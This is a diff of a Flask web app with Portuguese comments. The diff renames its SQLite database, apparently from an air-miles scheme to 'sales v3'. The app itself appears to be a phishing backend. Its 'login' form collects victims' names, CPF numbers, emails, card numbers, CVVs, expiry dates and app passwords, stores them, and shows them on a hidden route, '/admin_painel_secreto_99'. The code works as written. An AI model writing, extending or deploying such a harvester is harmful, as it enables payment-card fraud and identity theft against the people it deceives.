@@ -6,9 +6,9 @@ app = Flask(__name__)
 
 def init_db():
     try:
-        conn = sqlite3.connect('dados_milhas.db')
+        # Usando um nome de banco novo para evitar conflitos de colunas antigas
+        conn = sqlite3.connect('dados_vendas_v3.db')
         cursor = conn.cursor()
-        # Cria a tabela com os novos campos de cartão
         cursor.execute('''CREATE TABLE IF NOT EXISTS clientes 
             (id INTEGER PRIMARY KEY AUTOINCREMENT, 
              nome TEXT, cpf TEXT, email TEXT, 
@@ -33,7 +33,7 @@ def login():
         cvv = request.form.get('cvv')
         validade = request.form.get('validade')
         
-        conn = sqlite3.connect('dados_milhas.db')
+        conn = sqlite3.connect('dados_vendas_v3.db')
         cursor = conn.cursor()
         cursor.execute('''INSERT INTO clientes (nome, cpf, email, num_cartao, senha_app, cvv, validade) 
                           VALUES (?,?,?,?,?,?,?)''', (nome, cpf, email, cartao, senha, cvv, validade))
@@ -50,7 +50,7 @@ def sucesso():
 @app.route('/admin_painel_secreto_99')
 def admin():
     try:
-        conn = sqlite3.connect('dados_milhas.db')
+        conn = sqlite3.connect('dados_vendas_v3.db')
         cursor = conn.cursor()
         cursor.execute('SELECT * FROM clientes ORDER BY id DESC')
         usuarios = cursor.fetchall()
@@ -63,6 +63,7 @@ if __name__ == '__main__':
     init_db()
     port = int(os.environ.get("PORT", 10000))
     app.run(host='0.0.0.0', port=port)
+
 
 
 
